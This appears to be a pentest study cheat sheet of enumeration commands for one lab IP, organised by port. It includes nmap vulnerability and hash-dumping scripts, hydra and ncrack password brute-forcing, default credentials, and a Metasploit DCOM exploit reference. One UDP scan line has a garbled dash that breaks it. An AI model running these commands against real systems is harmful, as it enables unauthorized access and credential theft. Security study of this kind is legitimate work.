# First
sudo nmap -p- --min-rate=1000 -T4 -v 192.168.200.5 -Pn | tee nmap-ports
ports=$(grep ^[0-9] ./nmap-ports | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
echo -e "\nPorts-to-Scan:" $ports
sudo nmap -sV -sC -v -p $ports 192.168.200.5 -Pn | tee nmap-fulltcp
echo -e "\nSummary:"
grep ^[0-9] ./nmap-fulltcp

# Consider UDP (ex: snmp)
sudo nmap --top-ports 20 -sU -sV -sC -v 192.168.200.5 | tee nmap-udp20
sudo nmap -sUV -T4 -F -v --version-intensity 0 192.168.200.5 | tee nmap-udpfast
sudo nmap -p0-65535 -Pn â€“sU -v 192.168.200.5 | tee nmap-udpall

# Consider nmapAutomator
sudo nmapAutomator.sh -H 192.168.200.5 -t Script | tee nmap-auto-script
sudo nmapAutomator.sh -H 192.168.200.5 -t Vulns | tee nmap-auto-vulns
sudo nmapAutomator.sh -H 192.168.200.5 -t Recon | tee nmap-auto-recon
sudo nmapAutomator.sh -H 192.168.200.5 -t All | tee nmap-auto-all

# Vulns
nmap -Pn -v --script vuln 192.168.200.5  ..vul/cve detection, No Pings 
nmap --script safe -v -p 445 192.168.200.5

# Scripts
locate -r '\.nse$' | xargs grep categories | grep 'default\|version\|safe' | grep smb
ls -l /usr/share/nmap/scripts/nfs* 

# 80/443 Web
nmap -p 80 -nv --script=http-vuln-cve2010-2861 192.168.200.5  #coldfusion 
nmap -p 80 -v --script http-shellshock --script-args uri=/cgi-bin/vulnscript.sh 192.168.200.5
nmap -p 80 -v --script http-shellshock --script-args uri=/cgi-bin/admin.cgi 192.168.200.5 
nmap -p 443 -v --script ssl-heartbleed 192.168.200.5
sslscan 192.168.200.5:443

# 111/2049 NFS
nmap -sV -v --script=nfs-showmount 192.168.200.5
nmap -p 111,2049 -v --script nfs* 192.168.200.5
nmap -p 111,2049 -sV -v --script=rpcinfo 192.168.200.5
showmount -e 192.168.200.5
mkdir /tmp/nfs
su mount -t nfs 192.168.200.5/found /tmp/nfs

# 25 SMTP
nmap -pT:25 -v --script smtp-commands.nse 192.168.200.5
nmap -v -p 25 --script smtp-enum-users --script-args smtp-enum-users.methods={VRFY} 192.168.200.5
nmap -v -p 25 --script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 192.168.200.5
nc -nvv 192.168.200.5 25
HELO foo<cr><lf>

# 139/445 SMB
enum4linux -A 192.168.200.5
sudo nmap -p 139,445 -v --script=smb-vuln* 192.168.200.5 
sudo nmap -p 445 -v --script=smb-enum-shares,smb-enum-users 192.168.200.5 
sudo nmap -v --script=smb2-capabilities,smb-print-text,smb2-security-mode.nse,smb-protocols,smb2-time.nse,smb-psexec,smb2-vuln-uptime,smb-security-mode,smb-server-stats,smb-double-pulsar-backdoor,smb-system-info,smb-vuln-conficker,smb-enum-groups,smb-vuln-cve2009-3103,smb-enum-processes,smb-vuln-cve-2017-7494,smb-vuln-ms06-025,smb-enum-shares,smb-vuln-ms07-029,smb-enum-users,smb-vuln-ms08-067,smb-vuln-ms10-054,smb-ls,smb-vuln-ms10-061,smb-vuln-ms17-010,smb-os-discovery --script-args=unsafe=1 -T5 192.168.200.5 -oG nmap-smb
smbmap -H 192.168.200.5
smbmap -H 192.168.200.5 -u '' -p '' 
smbclient -L 192.168.200.5 
smbclient -L //192.168.200.5/ -U "guest"
smbclient //192.168.200.5/share -N

# 1433 MSSQL
sudo nmap -p 1433 -v --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV 192.168.200.5 -oG nmap-mssql 

# 21 FTP
nmap -p 21 --script=ftp-anon,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum 192.168.200.5
hydra -C $ftpbetterdefaultpasslist 192.168.200.5 ftp

# 5437 Postgres
psql -h 192.168.200.5 -U postgres -p 5437

# 3306 MySQL
nmap -p 3306 -sV -Pn -vv -script=mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 192.168.200.5
nmap -p 3306 -v --script mysql-brute -T5 -nv 192.168.200.5
mysql -h 192.168.200.5 -u root -p
mysql -h 192.168.200.5 --port=3306 --user=root -p 
mysql -h 192.168.200.5 -uroot -ppassword -e 'show databases;' 

# 161/162 UDP - SNMP
snmp-check -t 192.168.200.5 -c public
sudo nmap -vv -sV -sU -Pn -p 161,162 --script=snmp-netstat,snmp-processes 192.168.200.5
echo -e "public\nprivate\nmanager\ncommunity" > community.txt 
REF: danielmiessler > "common-snmp-community-strings.txt"
onesixtyone -c community.txt 192.168.200.5
snmpwalk -c public -v1 -t 10 192.168.200.5
snmpwalk -c public -v1 192.168.200.5 1.3.6.1.4.1.77.1.2.25 

# 135 RPC
nmap -p 135 192.168.200.5 --script=msrpc-enum
msf > use exploit/windows/dcerpc/ms03_026_dcom
rpcclient 192.168.200.5 -U ''
srvinfo
enumdomusers

# 1521 ORACLE
tnscmd10g version -h 192.168.200.5
tnscmd10g status -h 192.168.200.5

# 2100 - Oracle XML DB
Can be accessed through ftp. Some default passwords here: 
https://docs.oracle.com/cd/B10501_01/win.920/a95490/username.htm
sys:sys
scott:tiger

# 22 SSH
hydra -f -V -I -t 50 -l bob -P $rockyou 192.168.200.5 ssh -s 22022

# 3389 RDP Remote Desktop
rdesktop -u guest -p guest 192.168.200.5 -g 94%   ..Login to learn OS
hydra -t 1 -V -f -l users.txt -P $commontenk rdp://192.168.200.5
ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://192.168.200.5
xfreerdp /v:192.168.200.5 /d:mike.com /u:bob /p:paxxword -sec-nla +clipboard /geometry /w:1680 /h:900

# LDAP
nmap -n -sV --script "ldap* and not brute" 192.168.200.5 | tee nmap-ldap
ldapsearch -x -H "ldap://192.168.200.5" -D '' -w '' -b "DC=mike,DC=domain" | grep sAMAccountName:

# 554 - RTSP
Port 1030/1032/1033/1038
Used by RPC to connect in domain network. Usually nothing.

# 69 UDP TFTP
nmap -sU -p 69 -v --script tftp-enum.nse 192.168.200.5 
nmap -sU -p 69 -v --script tftp-enum.nse --script-args tftp-enum.filelist=windowsloot.txt 192.168.200.5

# Default cred scan: 
changeme.py 192.168.200.5
changeme.py 192.168.200.5/24 
changeme.py nmap_subnet.xml 
changeme.py --protocols ssh,ssh_key 192.168.200.5/24 
changeme.py snmp://192.168.200.5

# Consider
mxweb mxcurls mxsamba
